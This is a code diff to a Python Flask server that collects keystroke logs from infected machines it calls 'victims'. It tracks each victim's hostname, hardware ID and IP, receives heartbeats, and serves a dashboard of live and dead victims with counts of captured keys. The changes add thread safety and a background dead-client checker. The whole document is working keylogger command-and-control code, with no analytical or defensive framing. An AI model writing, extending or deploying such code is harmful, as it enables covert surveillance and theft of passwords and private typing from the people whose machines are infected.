@@ -3,6 +3,8 @@ import os
 import datetime
 import sys
 import socket
+import threading
+import time
 
 app = Flask(__name__)
 
@@ -10,6 +12,7 @@ LOG_DIR = "logs"
 os.makedirs(LOG_DIR, exist_ok=True)
 
 victims = {}
+victims_lock = threading.Lock()  # Thread safety for shared dict
 HEARTBEAT_TIMEOUT = 20
 
 # --- ANSI Color Codes ---
@@ -201,34 +204,33 @@ def receive_log():
         preview = keystrokes[:120]  # show first 120 chars
         Log.keystroke(hostname, hwid, len(keystrokes), preview)
     elif is_first_contact:
-        # First contact with no keystrokes yet (just system info)
         pass  # new_victim was already printed above
 
     # --- In-memory victim tracking ---
-    was_alive = False
-    if hwid not in victims:
-        victims[hwid] = {
-            "hostname": hostname,
-            "ip": client_ip,
-            "first_seen": now,
-            "last_seen": now,
-            "last_seen_ts": now_ts,
-            "total_keys": 0,
-            "alive": True,
-            "prev_alive": True,
-        }
-    else:
-        was_alive = victims[hwid].get("alive", False)
+    with victims_lock:
+        was_alive = False
+        if hwid not in victims:
+            victims[hwid] = {
+                "hostname": hostname,
+                "ip": client_ip,
+                "first_seen": now,
+                "last_seen": now,
+                "last_seen_ts": now_ts,
+                "total_keys": 0,
+                "alive": True,
+            }
+        else:
+            was_alive = victims[hwid].get("alive", False)
 
-    victims[hwid]["last_seen"] = now
-    victims[hwid]["last_seen_ts"] = now_ts
-    victims[hwid]["total_keys"] += len(keystrokes)
-    victims[hwid]["ip"] = client_ip
-    victims[hwid]["alive"] = True
+        victims[hwid]["last_seen"] = now
+        victims[hwid]["last_seen_ts"] = now_ts
+        victims[hwid]["total_keys"] += len(keystrokes)
+        victims[hwid]["ip"] = client_ip
+        victims[hwid]["alive"] = True
 
-    # Detect recovery from dead → alive
-    if not was_alive:
-        Log.status_change(hostname, hwid, alive=True)
+        # Detect recovery from dead → alive
+        if not was_alive:
+            Log.status_change(hostname, hwid, alive=True)
 
     return "OK", 200
 
@@ -241,31 +243,31 @@ def heartbeat():
     now = datetime.datetime.now().isoformat(timespec="seconds")
     now_ts = datetime.datetime.now().timestamp()
 
-    was_alive = False
-    if hwid not in victims:
-        victims[hwid] = {
-            "hostname": hostname,
-            "ip": client_ip,
-            "first_seen": now,
-            "last_seen": now,
-            "last_seen_ts": now_ts,
-            "total_keys": 0,
-            "alive": True,
-            "prev_alive": True,
-        }
-        Log.new_victim(hostname, hwid, client_ip)
-    else:
-        was_alive = victims[hwid].get("alive", False)
-        victims[hwid]["last_seen"] = now
-        victims[hwid]["last_seen_ts"] = now_ts
-        victims[hwid]["ip"] = client_ip
-        victims[hwid]["alive"] = True
-
-        # Print heartbeat (dim) unless status changed
-        if not was_alive:
-            Log.status_change(hostname, hwid, alive=True)
+    with victims_lock:
+        was_alive = False
+        if hwid not in victims:
+            victims[hwid] = {
+                "hostname": hostname,
+                "ip": client_ip,
+                "first_seen": now,
+                "last_seen": now,
+                "last_seen_ts": now_ts,
+                "total_keys": 0,
+                "alive": True,
+            }
+            Log.new_victim(hostname, hwid, client_ip)
         else:
-            Log.heartbeat(hostname, hwid)
+            was_alive = victims[hwid].get("alive", False)
+            victims[hwid]["last_seen"] = now
+            victims[hwid]["last_seen_ts"] = now_ts
+            victims[hwid]["ip"] = client_ip
+            victims[hwid]["alive"] = True
+
+            # Print heartbeat (dim) unless status changed
+            if not was_alive:
+                Log.status_change(hostname, hwid, alive=True)
+            else:
+                Log.heartbeat(hostname, hwid)
 
     return "PONG", 200
 
@@ -273,32 +275,56 @@ def heartbeat():
 def is_victim_alive(last_seen_ts):
     return (datetime.datetime.now().timestamp() - last_seen_ts) < HEARTBEAT_TIMEOUT
 
+
+def dead_client_checker():
+    """
+    Background thread that runs every 5 seconds and checks ALL victims.
+    If any victim's last_seen_ts exceeds HEARTBEAT_TIMEOUT and they're still
+    marked alive, it flips them to dead and logs the status change immediately.
+    """
+    while True:
+        time.sleep(5)  # Check every 5 seconds
+        with victims_lock:
+            now_ts = datetime.datetime.now().timestamp()
+            for hwid, info in list(victims.items()):
+                currently_alive = (now_ts - info["last_seen_ts"]) < HEARTBEAT_TIMEOUT
+                prev_alive = info.get("alive", True)
+
+                # Detect alive → dead transition
+                if prev_alive and not currently_alive:
+                    info["alive"] = False
+                    # Print dead notification immediately — no waiting for dashboard visit
+                    Log.status_change(info["hostname"], hwid, alive=False)
+
+
 @app.route("/clients", methods=["GET"])
 def list_clients():
-    for hwid, info in victims.items():
-        currently_alive = is_victim_alive(info["last_seen_ts"])
-        prev_alive = info.get("alive", True)
-        info["alive"] = currently_alive
+    with victims_lock:
+        now_ts = datetime.datetime.now().timestamp()
+        for hwid, info in victims.items():
+            currently_alive = (now_ts - info["last_seen_ts"]) < HEARTBEAT_TIMEOUT
+            prev_alive = info.get("alive", True)
+            info["alive"] = currently_alive
 
-        # Detect alive → dead transition
-        if prev_alive and not currently_alive:
-            Log.status_change(info["hostname"], hwid, alive=False)
+            # Detect alive → dead transition (belt-and-suspenders with the background thread)
+            if prev_alive and not currently_alive:
+                Log.status_change(info["hostname"], hwid, alive=False)
 
-    rows = ""
-    for hwid, info in sorted(victims.items(), key=lambda x: x[1]["last_seen"], reverse=True):
-        status = "🟢 Alive" if info["alive"] else "🔴 Dead"
-        status_color = "#00aa00" if info["alive"] else "#aa0000"
-        rows += (
-            f"<tr>"
-            f"<td>{info['hostname']}</td>"
-            f"<td><code>{hwid}</code></td>"
-            f"<td>{info['ip']}</td>"
-            f"<td style='color: {status_color}; font-weight: bold;'>{status}</td>"
-            f"<td>{info['last_seen']}</td>"
-            f"<td>{info['first_seen']}</td>"
-            f"<td>{info['total_keys']}</td>"
-            f"</tr>"
-        )
+        rows = ""
+        for hwid, info in sorted(victims.items(), key=lambda x: x[1]["last_seen"], reverse=True):
+            status = "🟢 Alive" if info["alive"] else "🔴 Dead"
+            status_color = "#00aa00" if info["alive"] else "#aa0000"
+            rows += (
+                f"<tr>"
+                f"<td>{info['hostname']}</td>"
+                f"<td><code>{hwid}</code></td>"
+                f"<td>{info['ip']}</td>"
+                f"<td style='color: {status_color}; font-weight: bold;'>{status}</td>"
+                f"<td>{info['last_seen']}</td>"
+                f"<td>{info['first_seen']}</td>"
+                f"<td>{info['total_keys']}</td>"
+                f"</tr>"
+            )
 
     return f"""<!DOCTYPE html>
             <html>
@@ -369,4 +395,11 @@ def view_log(filename):
 
 if __name__ == "__main__":
     Log.server_start()
+    
+    # Start the dead-client detection background thread
+    checker = threading.Thread(target=dead_client_checker, daemon=True)
+    checker.start()
+    cprint("  Dead-client watcher thread started (checking every 5s)", color=C.DIM)
+    print()
+    
     app.run(host="0.0.0.0", port=8443, ssl_context="adhoc")
